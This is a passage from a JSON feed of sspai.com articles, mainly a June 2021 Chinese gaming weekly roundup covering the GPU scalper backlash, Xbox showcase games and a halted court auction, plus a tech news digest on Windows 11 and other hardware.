Windows 10 用户均可免费升级，你可以 <a href=\"https://aka.ms/GetPCHealthCheckApp\" target=\"_blank\">使用本工具</a> 检查你的电脑是否符合升级的要求。</p>\n<p>附·Windows 11 仅提供 64 位处理器支持，不会提供 32 位版本，硬件则需要符合以下标准：</p>\n<ul>\n<li>处理器：1GHz 或更快，在兼容的 64 位处理器或 SoC 上有 2 个或更多核心</li>\n<li>内存：4GB</li>\n<li>存储器：64GB 或更大的存储设备</li>\n<li>系统固件：UEFI，支持 Secure Boot</li>\n<li>TPM：可信平台模块（TPM）2.0 版</li>\n<li>图形卡：兼容 DirectX 12 或更高版本的 WDDM 2.0 驱动</li>\n<li>显示器：对角线大于 9 英寸的高清晰度（720p）显示器，每条颜色通道 8 比特</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，第一时间解读 Windows 动态 🐱‍🏍</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67413"},{"title":"瞎玩菌的游戏周报：「显卡战争」、Xbox 扩展发布会、天价法拍等","date":"2021-06-25 03:21:42","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.6.25 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>资讯</h2>\n<h3>在刚过去的 6.18 电商购物节，玩家发起了一场面向显卡黄牛的「战争」</h3>\n<p>原本用于玩游戏的显卡，如今一卡难求，众所周知，这是被矿老板们抢走了的缘故。囤积了显卡的黄牛们，在矿老板的掩护下，不谋而合地做起了高价显卡的生意。</p>\n<p>不久前，局势发生了变化：</p>\n<ul><li>今年 5 月，比特币（Bitcoin）、以太坊（ETH）等数字货币价格崩盘，其中比特币从 5 万多美元一路暴跌到 3 万多美元，并且下行势头还未停止。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/cac658b3c1e8614988629270da7ef671.jpg\"><figcaption>图源 <a href=\"https://twitter.com/whyysooo/status/1394541748001546241\">Twitter deeksha</a></figcaption></figure><ul>\n<li>5 月 13 日，特斯拉 CEO 马一龙突然宣布暂停比特币支付，理由是「不环保」。这让比特币的局势如同雪中送冰淇淋。</li>\n<li>5 月 18 日，中国互联网金融协会、中国银行业协会、中国支付清算协会联合发布《<a href=\"http://www.xinhuanet.com/fortune/2021-05/18/c_1127461941.htm\">关于防范虚拟货币交易炒作风险的公告</a>》，明确指出金融机构、支付机构等机构不得开展与加密数字币相关的业务。</li>\n<li>5 月 21 日，中国的 <a href=\"http://www.gov.cn/xinwen/2021-05/21/content_5610192.htm\">国务院金融稳定发展委员会</a> 明确表态将打击虚拟货币的挖矿和交易行为，指出「打击比特币挖矿和交易行为，坚决防范个体风险向社会领域传递」。</li>\n<li>6月，<a href=\"https://mp.weixin.qq.com/s/Uq-9v82KIT4piWXw7GNomA\">内蒙古、四川</a> 等各地政府开始关停和清退矿场。要知道世界最大的矿池，大部分都在中国。</li>\n<li>6 月 21 日，<a href=\"https://weibo.com/1891502860/KldZL5Gpn\">支付宝</a> 发布《关于禁止使用我公司服务开展比特币等虚拟货币交易的声明 》。</li>\n</ul>\n<p>玩家期盼已久的「矿难」似乎就要来了。</p>\n<p>就在刚刚过去的 6.18，国内各大电商进行了一年一度的大促，其中显卡当然也是促销的商品类目之一。玩家久等的显卡终于等来了促销，不少黄牛商家促销的显卡依然比官方定价高出了一两千，只是比平时略微便宜了一点。然而忍痛下单的玩家熬着夜抢购显卡的结果是，商家假装上架销售，实际不发货，一直拖到订单过期。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/24/f3d6506ed3ac548f338704e96124a97d.jpg\"><figcaption>「三千预算进卡吧，加钱加到九万八」就是说的这里</figcaption></figure><p>玩家们终于忍无可忍，百度用户量最大的贴吧之一「<a href=\"https://www.tieba.com/f?kw=%E6%98%BE%E5%8D%A1\">显卡吧</a>」的玩家们率先站出来发起了反击——闲鱼（吧友称之为「海鲜市场」）突然上架了大量的「空气」显卡，这些显卡的共同特点是：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/64a157effd73a11b66a508428505188d.jpg\"></figure><ul>\n<li>平价：不仅不加价，甚至比官方定价还便宜。</li>\n<li>描述信息以假乱真：商品描述五花八门，为抛售显卡而编造的理由各异，堪比故事会。但描述里都用一句「懂得都懂」或「DDDD」来暗示这次行动。</li>\n<li>不发货：即使被看不懂暗号的买家拍下，卖家也不会给不明真相的买家发货，并劝说买家暂时不要购买显卡，让黄牛们把囤积的显卡「烂」在手里。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/8f1f318906cb84e696106aa73a8129eb.png\"><figcaption>显卡吧制作的活动海报</figcaption></figure><p>这场活动的口号就是「你不买，我不买，明天还能降两百」。</p>\n<p>这场「以空气搏空气」活动的主角们很快扩散到了贴吧以外的其他平台，越来越多的人参与到了这场打垮黄牛的战争中。</p>\n<p>大规模行动的方式效果显著。由于闲鱼的机制，平价显卡排在搜索结果中更靠前的位置，而黄牛的高价显卡则被淹没在了平价显卡的汪洋大海中，得不到展示的机会。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/24/dbdc6d004cb033a0463480dfb693aa92.jpg\"></figure><p>受到影响的黄牛们气急败坏，除了一些破口大骂，还有一些哭诉起自己的损失巨大，承受不了。这让玩家们的情绪受到了鼓舞，他们参与行动的努力没有白费。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/09e6254ab8ad8fddcddaa20d53156323.jpg\"><figcaption>鳄鱼的眼泪</figcaption></figure><p>除了黄牛受到打击，受到「矿难」和政策双重影响，矿老板也连夜跑路。</p>\n<p>6 月 19 日，世界第五大矿池 BTC.com 收到了国网四川甘孜电力有限公司的 <a href=\"https://0xzx.com/2021062218001536598.html\">停电通知</a>，因此他们决定把矿机迁移到中国境外。6 月 22 日，他们宣布其第一批矿机成功迁移到哈萨克斯坦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/1b8f8b2481d58020df5b536f7062945c.jpeg\"></figure><p>最后提醒一下各位持币待购显卡的玩家们，由于国内矿场关停，可能会有大量二手矿渣显卡经过翻新处理后，重新包装流入市场，请大家谨慎购买，仔细分辨，别贪便宜当了接盘侠。</p>\n<p>大不了就躺平做等等党，等到 40 系显卡出来再买。等待期间，对玩家来说可能是少玩会游戏，多踢会球或者看看剧，而对囤货的黄牛来说，压货占用的资金、仓储等可是实打实的损失。</p>\n<p>想玩游戏的玩家还可以考虑一下游戏主机，例如次世代的 PS5 和 XSX，同样内置了高端显卡，并且还不能挖矿，不用担心跟矿工竞争。不过这么想的可不止我一个，也有黄牛参与到了炒国行主机的热潮中，跟显卡黄牛一样，他们的做法无非是原价买，加价卖。</p>\n<p>对抗国行主机黄牛的玩家们也采用了同样的打法：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/23/f128c472c9a3630d09d6916b635445c3.jpg\"></figure><h3>E3 还不够，微软举办 Xbox 扩展版游戏发布会</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/19e8d4a7b9b111341333ae1dee679e52.jpg\"></figure><p>6 月 18 日，微软举办了 <a href=\"https://www.youtube.com/watch?v=L7ZCGAUSCAU\">Xbox 扩展版游戏发布会</a>（<a href=\"https://news.xbox.com/en-us/2021/06/17/xbox-games-showcase-extended-recap/\">Xbox Games Showcase Extended</a>），补充了一些在 E3 的 Xbox &amp; Bethesda 专场发布会没来得及充分展示的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/a528931a845b9521e77688b08cc47737.jpg\"></figure><p>《<a href=\"https://www.xbox.com/en-US/games/forza-horizon-5\">极限竞速 地平线 5</a>》（Forza Horizon 5）是一封写给墨西哥的情书，其中充满了广阔、多样、不断发展的世界，具有惊人的对比和美感。玩家将能够带领令人叹为观止的探险队穿越墨西哥，在那里他们将发现活生生的沙漠、郁郁葱葱的丛林、历史悠久的城市、隐秘的遗迹、原始的海滩和高耸入云的雪山。游戏将在 11 月 9 日正式登陆 Xbox Series X|S、Win 10 商店、Steam 以及 Xbox Game Pass。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/1ef2304b1d047cc8d53abe142d7a5f09.jpg\"></figure><p>《<a href=\"https://www.xbox.com/en-US/games/senuas-saga-hellblade-II\">地狱之刃 2 塞纳传奇</a>》（Senua's Saga: Hellblade 2）的开发团队努力重现 9 世纪的冰岛，竭力为其土地和当时的服装带来真实感。他们还分享了一段 <a href=\"https://www.youtube.com/watch?v=a322kVx5vhc\">蒙太奇视频</a>，介绍了开发团队成员在工作中通过动作捕捉、动画或现场录音的情况，下面是 Xbox 官方的 B 站中文字幕版本（播放量很低，不愧为 B 站「最惨官方」账号之一）。</p> <p>《脑航员 2》（Psychonauts 2）的开发者做了游玩演示，并讲述了一部分剧情。为避免剧透这里就不多说了。不过不用等太久，游戏将会在 8 月 25 日发售。</p>\n<p>《The Anacrusis》是一款多人射击游戏，CEO Chet Faliszek 介绍了游戏如何动态适应不同玩家的游玩风格。</p>\n<p>《潜行者 2：切尔诺贝利之心》（S.T.A.L.K.E.R. 2: Heart of Chernobyl）演示了游戏更多的细节，例如一个新的派别，见到一些经典的场景。游戏将在 2022 年 4 月 28 日发售。</p>\n<p>《瘟疫故事：无罪》（A Plague Tale: Innocence）将于 7 月 6 日针对 Xbox Series X|S 进行优化，以支持 4K + 60 帧。这款游戏可以通过 XGP 游玩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/3f6bd62ae040d73ff7cbb68e7a360f62.jpg\"></figure><p>《帝国时代 4》（Age of Empires IV）回顾了 E3 期间展示的一些令人兴奋的新内容，包括你可以在战斗中领导的另外两个文明，即阿巴斯王朝和法国人；百年战争战役，以圣女贞德为主角，也被披露为游戏中的英雄人物之一；以及海战。另外还独家披露了剩下的首发文明，神圣罗马帝国和罗斯，以及剩下的首发活动：莫斯科的崛起和蒙古帝国。玩家们可以在 10 月 28 日玩到《帝国时代 4》。</p>\n<p>《战地 2042》（Battlefield 2042）分享了这款多人游戏的一些新细节，比如他们如何做到在一张地图上最多有 128 名玩家，以及玩家如何创造他们自己独特的战地时刻。游戏还有陆上、空中和海上的全面战争体验。特别是征服游戏模式（Conquest game mode），它可以在这些巨大的地图上容纳许多不同的战斗，比如组队攻下各种目标，给《战地2042》的沙盒带来充分的自由度。游戏将在 10 月 22 日发售。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/bba24dce4c4a44262b9fe010156cd80a.jpg\"><figcaption>Jack Sparrow 船长</figcaption></figure><p>《盗贼之海：海盗的生活》（Sea of Thieves: A Pirate's Life）<a href=\"https://www.youtube.com/watch?v=bfBmlrLc7Ls\">演示</a> 了游戏玩法。《海盗的生活》是《盗贼之海》的一次大规模免费更新，它把电影《加勒比海盗》中的主角 Jack Sparrow 船长带入游戏，进行这次全新的冒险。下面是官方公布的一部分截图，你还可以在 <a href=\"https://news.xbox.com/en-us/2021/06/16/sea-of-thieves-a-pirates-life-gameplay-screenshots-revealed/\">这里</a> 下载更多原图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/6d21c52c84d88e4bce629f760fa5cd3b.jpg\"><figcaption>黑珍珠号</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/7a7d76c545eebb40baceb666f44cabd6.jpg\"><figcaption>飞翔的荷兰人</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/2ce28ddb1181e2a1f59f6dc8c05af999.jpg\"><figcaption>水手之墓</figcaption></figure> <p>《微软模拟飞行》（Microsoft Flight Simulator）将于 7 月 27 日登陆 Xbox Series X|S。</p>\n<p>《哈迪斯》（Hades）将于 8 月 13 日登陆 Xbox Series X|S，并首日加入 XGP。</p>\n<p>ID@Xbox 游戏将加入 XGP。这意味着玩家可以在 XGP 中玩到更多独立游戏。下面这些 ID@Xbox  游戏将会在发售首日加入 XGP：</p>\n<ul>\n<li>《龙与地下城：黑暗联盟》（Dungeons and Dragons: Dark Alliance） (PC、云端和主机) - 6 月 22 日</li>\n<li>《崛起》（The Ascent）（PC、云端和主机）- 7 月 29 日</li>\n<li>《Sable》 (PC、云端和主机) - 9 月 23 日</li>\n<li>《Shredders》（云端和主机）- 2021 年 12 月</li>\n<li>《血根》（Bloodroots）(PC、云端和主机) - 2021年</li>\n<li>《你好邻居 2》（Hello Neighbor 2） (PC、云端和主机) - 2021年</li>\n<li>《The Gunk》(PC、云端和主机) - 2021年</li>\n<li>《战锤：黑潮》（Warhammer: Darktide）(PC、云端和主机) - 2021年</li>\n<li>《原子之心》（Atomic Heart）</li>\n<li>《中世纪王朝》主机版（Medieval Dynasty）</li>\n<li>《被取代》（Replaced）</li>\n<li>《Roboquest》</li>\n<li>《史莱姆牧场 2》（Slime Rancher 2）</li>\n<li>《Somerville》</li>\n<li>《潜行者 2：切尔诺贝利之心》（S.T.A.L.K.E.R. 2: Heart of Chernobyl）</li>\n</ul>\n<p>《禁闭求生》（Grounded）6 月 30 日将迎来大规模的内容更新，名叫《蘑菇与厄运》（Shroom &amp; Doom）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/5667b8280b3903431fb4ff119f79f8a3.jpg\"></figure><p>《光环 无限》（Halo Infinite）的开发者 343 工业公司介绍了多人模式的更多细节，包括了解更多关于斯巴达指挥官 Laurette 的情况，他负责监督斯巴达学院，学院的功能将教授游戏的基础知识，训练模式可以让你尝试使用武器和与机器人对战。开发者还详细介绍了大团队战——一种 12 对 12 的车辆融合模式。最后，他们分享了盔甲定制的更多细节，如 Yoroi 斯巴达盔甲，在《光环 无限》第一季中可以通过玩特别活动免费解锁。</p>\n<p>不久之后，玩家就有机会帮助塑造这种多人游戏体验。今年夏天，343 计划向有限的受众发布技术预览，所以一定要在 <a href=\"https://www.halowaypoint.com/en-us/community/halo-insider\">HaloInsider.com</a> 注册，以便有机会在这个假期游戏推出之前参与。</p>\n<p>该团队还强调，发布只是《光环无限》多人游戏旅程的开始，该游戏将在主机和 PC 上免费玩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/d0a04ed9aa2d4cd6e6674a2ed025e4b9.jpg\"></figure><p>《猩红结系》（Scarlet Nexus）分享了 <a href=\"https://www.youtube.com/watch?v=FcJ8UV1ZwCA\">开发者</a> 如何用 4 年时间打造这个世界，让玩家近距离地、更详细地了解了这个游戏、它的世界，以及一切是如何形成的。</p> <p><a href=\"https://xboxdesignlab.xbox.com/\">Xbox 设计实验室</a> 回归！这是整场发布会讨论热度最高的亮点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/a8c4875e317da7c928cdd382298319c7.jpg\"></figure><p>你可以进行个性化设计，创造一个属于你的控制器。玩家可以用 18 种颜色进行定制，包括新的颜色，如震荡蓝、脉冲红和电力黄，几乎所有的控制器外部部件，如机身、背壳、十字键、扳机键等都可以自定义，可以搭配出上百万种组合。Xbox 设计实验室在美国、加拿大和大多数西欧国家开放销售，起价 69.99 美元。</p>\n<p>希望这项服务开放到中国来，并且下一步可以考虑支持一下主机外观的定制。</p> <p>Xbox 相关一句话新闻：</p>\n<ul>\n<li><a href=\"https://www.polygon.com/interviews/22539158/xbox-game-studios-diversity-peter-wyse\">Xbox 游戏工作室执行官称工作重点是多样性——游戏、工作室和玩家的多样性</a></li>\n<li><a href=\"https://www.polygon.com/22536984/xbox-series-x-cloud-gaming-one-streaming\">Xbox One 将通过云串流方式玩到 Xbox Series X 游戏</a></li>\n</ul>\n<p>另外，少数派商店上架了来自 imPoi 的 Xbox / PlayStation 的手柄充电底座，券后 ￥89，其中 Xbox 款额外送两块电池 ，感兴趣的可以戳 <a href=\"https://sspai.com/post/67402\" target=\"_blank\">这里</a> 了解。</p>\n<h3>法拍《游戏王》<strong>纯金</strong>卡牌「青眼白龙」竞价到 8700 万被中止</h3>\n<p>6 月 21 日，市价在 20 ~ 30 万元的 20 周年纪念版「青眼白龙」《游戏王》纯金卡牌，在阿里司法拍卖中心，从 80 元的起拍价，一直竞拍到 8732.6 万元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/cfa92b26f88cfba2ee5f71c121516389.jpg\"></figure><p>安徽省滁州市中级人民法院发现拍品与实际竞拍价格严重不符，可能存在恶意炒作与竞价行为，依法决定中止了拍卖。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/24/cf7677a409d5abe7e27119ed9e5edc38.jpg\"></figure><p>由于参与法拍只为合张影的网友众多，在这里做个科普——如果拍下来不付钱，可不止是没收保证金这么简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/62f92a71a0fe3c570887f4800bec511c.jpg\"></figure><p>可是，普法教育也挡不住各种专程前来打酱油的网友。</p>\n<p>6 月 22 日，同一名被执行人的另一件物品——一个粉红色的 4GB U盘被竞拍到了 39810 元，然后一样被法院中止。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/69affcdfaf9a1e119dbfafcddefce6c6.jpg\"></figure><p>只是一个 U 盘而已啊？</p>\n<p>你们是不是以为里面有比特币？</p>\n<ul><li>扩展阅读：<a href=\"https://www.zhihu.com/question/299977989\">法院都拍卖过哪些奇怪的东西？</a>\n</li></ul>\n<h3>《赛博朋克 2077》正式回归 PS 商店，官方不建议 PS4 玩家购买</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/59de301e4da93e7caf931acb36311fe9.jfif\"></figure><p><a href=\"https://twitter.com/PlayStation/status/1406922787382607875\">PlayStation</a> 官方宣布《<a href=\"https://store.playstation.com/product/HP4497-CUSA16570_00-0000000000000005?emcid=or-pl-405282\">赛博朋克 2077</a>》现已重新上架 PS 商店。</p>\n<p>PS4 版本的修复工作仍在进行中，更多修复内容及更新将在今年内陆续公布。为了获得最佳的游戏体验，PlayStation 官方建议在 PS4 Pro 或 PS5 主机上游玩，而不建议 PS4 玩家购买。</p>\n<p>《赛博朋克 2077》1.23 版本最近更新，跟往常一样，依然是在修 bug。</p>\n<p>按照 CDPR 之前的道歉声明和工作计划，免费的次时代版本更新将于今年下半年推出。</p>\n<p>结合本周第一条新闻来看，《赛博朋克 2077》至今最大的功劳就是让不少玩家在显卡大幅度涨价前为这个游戏升级了显卡配置。</p>\n<p>Xbox 终于结束了捡来的主机独占时期，这一独占就是半年。最后请 Xbox 玩家注意，Xbox 版《赛博朋克 2077》扩展退款政策将于 7 月 6 日结束。</p>\n<h3>《GTA》线上模式将于 12 月 16 日关闭 PS3 和 Xbox 360 版的服务器</h3>\n<p><a href=\"https://www.rockstargames.com/newswire/article/51989315o2aa3a/gta-online-for-playstation-3-and-xbox-360-will-shut-down-on-december-1\">Rockstar</a> 宣布由于关闭线上模式服务，PS3 和 Xbox 360 版的游戏内付费货币「鲨币」将在 9 月 15 日停止充值。</p>\n<p>这很可能是为了登陆次世代主机的《GTA V》加强版让路。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/5967350a62936fce3e89dd505d88d742.jpg\"></figure><h3>禁止内卷，开发《和平精英》的腾讯光子工作室推新规强制下班，实行一周以来效果如何？</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/eb5fef0fc7cb4a76835e950f4246f509.jpg\"></figure><p>开发了《和平精英》《欢乐斗地主》《节奏大师》的腾讯光子工作室内部的一份加班管理机制文件在互联网上广泛流传。</p>\n<p>文件中明确规定，每周三为健康日，早上 9 点半上班，晚上 6 点下班。同时，工作室要全面保障双休日和法定节假日休息，加班需要提前向领导申请报批，双休日不可连续加班。</p>\n<p>据瞎玩菌的鹅厂前同事匿名爆料，新规推行以来，确实有说到做到。晚上 9 点一到，老大就会来催员工下班；随后公司保安也会催促大家离开。然后电梯开始排起长龙，班车也变得拥挤了起来。</p>\n<p>而且不止光子工作室，腾讯游戏（即腾讯互娱事业部）本来就有周三健康日的惯例，周三不允许加班确实是这么实行的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/79721a3391cd8180361b7df7cf5bfd52.jpg\"><figcaption>日剧《我，到点下班》</figcaption></figure><h3>PS5 固件开放 beta 测试计划</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/426e6d865aa3f3a71d3602955719997d.jpg\"></figure><p>PS5 玩家可以通过 <a href=\"https://www.playstation.com/ps5/ps5-beta-program-sign-up\">官网</a> 注册登记，要求：</p>\n<ul>\n<li>年满 18 岁。</li>\n<li>暂时只面向美国、加拿大、日本、英国、德国和法国区域开放，请先使用对应区域的 PSN 账号登录再打开登记页面。</li>\n</ul>\n<p>参与测试的玩家请注意，系统固件版本可能存在不稳定的各种问题，请做好游戏存档的备份（推荐使用 PS+ 会员云存档和 USB 移动存储双重备份）。</p>\n<h3>Oculus Quest 更新增加了多任务和无线串流功能</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/69eef4285e73afbdacaa17fafe26a694.jpg\"></figure><p><a href=\"https://www.theverge.com/2021/6/18/22539750/oculus-quest-1-air-link-v30-update-multitasking\">Facebook</a> 正在向 Oculus Quest 和 Quest 2 VR 推出 v30 更新。正如 Mark Zuckerberg 本周早些时候所预览的那样，v30 包括一个无限办公室（Infinite Office）的全新多任务界面，让你把多个应用程序并排放在一起，包括浏览器、Oculus TV、Oculus Move、商店等等。</p>\n<p>v30 更新还为初代的 Quest 头显启用了 Air Link。Air Link 在 4 月时出现在 Quest 2 上，允许你将 VR 游戏从你的电脑无线传输到你的头显，而 Oculus Link 则通过 USB-C 电缆实现同样的功能。在以前，Quest 用户可以通过第三方应用程序 Virtual Desktop 无线传输 PC 游戏。</p>\n<h2>彩蛋</h2>\n<h3>🌈🥚1 国外黑客 <a href=\"https://twitter.com/HackerVilela/status/1405972177225191427\">@HackerVilela</a> 为 1990 年的 SNES 游戏《超级马力欧世界》制作了 <a href=\"https://github.com/VitorVilela7/wide-snes\">宽屏 mod</a>\n</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/50c706d56d30daf2766f27ea91fe60bd.png\"></figure><h3>🌈🥚2 《对马岛之鬼》的实体版封面去掉了 Only On PlayStation 字样，暗示这款游戏即将登陆 PC？</h3>\n<p><a href=\"https://direct.playstation.com/en-us/games/game/ghost-of-tsushima-ps4.3003170?smcid=pdc:us-en:web-pdc-games-ghost-of-tsushima:buttonblock-buy-now\">来源 1</a> | <a href=\"https://www.amazon.com/Ghost-Tsushima-PlayStation-4/dp/B08BSKT43L?ots=1&amp;slotNum=3&amp;imprToken=38bd1e60-32ba-ed31-76a\">来源 2</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/0b7ee718bb572724f68b9a9427202f76.png\"><figcaption>新封面</figcaption></figure><h3>🌈🥚3 据 <a href=\"https://twitter.com/StreamHatchet/status/1405218991518461956/photo/1\">Stream Hatchet</a> 统计，E3 期间 Xbox 发布会的观看人数创历史新高，但任天堂仍然是 E3 的主宰</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/7e712b87c568771bfe318591c7bbc492.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/84682d80dca78d61ea634cbe3378c43a.jpg\"></figure><h3>🌈🥚4 <a href=\"https://twitter.com/SEGA_OFFICIAL/status/1404998508264837121\">世嘉</a> 公布了一份超过 150 页的内部学习资料《<a href=\"https://www.slideshare.net/SEGADevTech/ss-249343092\">基础线性代数讲座</a>》，方便大家学习 3D 游戏开发</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/fde149e3d5803c5d2b760b8fa99f457a.png\"></figure><p>📧 反馈/纠错/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/67385"},{"title":"派早报：微软正式公布 Windows 11、Intel XMP 3.0 即将支持 DDR5 等","date":"2021-06-25 01:00:00","description":"\n<h2>微软正式公布 Windows 11</h2>\n<p>6 月 24 日晚间，微软通过线上直播正式公布了下一代桌面操作系统更新 Windows 11。Windows 11 在外观上与早前流出的泄露版并无太大差异，相比 Windows 10 最大的变化在于底部任务栏图标的居中、全新设计的开始菜单以及系统内大量圆角设计的引入；功能方面 Windows 11 为窗口操作扩展了快速窗口布局功能，不同应用窗口组成的布局方式还能保存为 snap group 群组，以单个图标的方式在任务栏呈现，方便用户快速切换；同时 Windows 11 也改善了外接屏幕支持，能够记住屏幕状态变化前后的窗口位置。</p>\n<p>软件体验方面，Windows 11 将预置 Teams 应用并与任务栏整合，同时拥有更好的平板触屏设备交互支持；引入 Xbox Series X|S 的 Auto HDR 和 Direct Storage 技术，为游戏带来更好的画面效果和更短的加载时间；支持运行 Android 应用，允许用户通过全新设计的 Microsoft 商店或亚马逊 App 商店进行安装。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6256e0e53295558b3a4c2da5801ecb41\"><figcaption>新的应用商店</figcaption></figure><p>Windows 11 将于下周率先登陆 Windows Insider 预览版计划，正式推出时间预计在 2021 年圣诞节前后；Windows 10 用户可免费升级。 </p>\n<p>如果你想了解更多关于 Windows 11 改动的详细信息，可以关注少数派之后的更多报道。 <a href=\"https://cn.engadget.com/windows-11-launch-microsoft-153031948.html\" target=\"_blank\">来源</a></p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67328\" target=\"_blank\">这就是下一代的 Windows？Windows 11 上手体验</a></p>\n<h2>Intel XMP 3.0 即将支持 DDR5</h2>\n<p>6 月 24 日，根据 HWiNFO 更新日志显示，Intel 目前正在开发 Extreme Memory Profile 3.0 的相关内容，并将支持 DDR5 内存超频。Extreme Memory Profile 3.0 意味着可以对电压进行更精准地调整，使得 DDR 5 最高支持 8400MHz 的内存频率。<a href=\"https://videocardz.com/newz/hwinfo-lists-intel-xmp-3-0-for-ddr5-memory-in-upcoming-software-changes\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/bb57e5cfb55094a295bce316ad4bbefe\"><figcaption>图片来自 HWiNFO</figcaption></figure><h2>TCL 显示器型眼镜将于下月登陆澳大利亚</h2>\n<p>TCL 于 6 月 24 日宣布，其显示器型眼镜将会在下月在澳大利亚开售，售价为 899 澳元，该眼镜将不会是所谓的 VR 或者 AR 设备，而是移动设备或者笔记本电脑的外部显示器，采用两个 1080P 的微型 OLED面板，可提供近似 140英寸屏幕的显示效果，适用于采用 USB-C DisplayPort 功能的手机、平板电脑和笔记本电脑，插入即可显示类似 16：9 屏幕的显示内容。<a href=\"https://www.theverge.com/2021/6/24/22545583/tcl-nxtwear-g-wearable-display-glasses-availability-price\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/2512a0dc5985e41edc9405f5bfae5702\"><figcaption>TCL 显示器型眼镜</figcaption></figure><h2>联想推出适用于笔记本的无线充电套装</h2>\n<p>联想于 6 月 24 日正式发布一款名为 Go 无线充电套件的新产品，可以为各种笔记本改装为无线充电功能，其采用了 Energy Square 的 Power by Contact 技术，通过一个3.2 毫米厚的拉丝金属充电垫进行输出，而电脑端通过 USB-C 连接无线充电接收器进行接收供电，设置完成后将可以为大多数 13 寸和 14 寸非触摸式笔记本电脑进行充电，效率可达 93%，该套件将在 10 月开售，售价为 139.99 美元。<a href=\"https://www.theverge.com/2021/6/24/22548300/lenovo-go-wireless-charging-kit-laptop-charger-date-price\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/10affda27353df6d4f9634a0804eaf36\"><figcaption>Go 无线充电套件</figcaption></figure><h2>Google 